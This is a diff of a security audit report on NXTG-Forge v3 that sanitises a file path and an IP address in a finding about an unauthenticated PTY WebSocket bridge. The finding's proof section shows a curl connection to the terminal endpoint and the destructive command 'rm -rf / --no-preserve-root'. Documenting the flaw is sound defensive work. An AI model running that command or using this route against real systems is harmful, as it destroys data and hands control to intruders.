@@ -52,7 +52,7 @@ NXTG-Forge v3 is a sophisticated AI-orchestrated development system with **solid
 
 ### 1. PTY Bridge Without Authentication (CRITICAL)
 
-**File:** `/home/axw/projects/NXTG-Forge/v3/src/server/pty-bridge.ts`
+**File:** `~/projects/NXTG-Forge/v3/src/server/pty-bridge.ts`
 **Lines:** 131-183, 211
 **Severity:** CRITICAL
 **CVSS Score:** 10.0 (Complete Remote Code Execution)
@@ -80,7 +80,7 @@ Any network client can:
 # Connect to WebSocket
 curl -i -N -H "Connection: Upgrade" \
   -H "Upgrade: websocket" \
-  ws://192.168.1.206:5051/terminal
+  ws://192.0.2.10:5051/terminal
 
 # Execute arbitrary commands
 rm -rf / --no-preserve-root
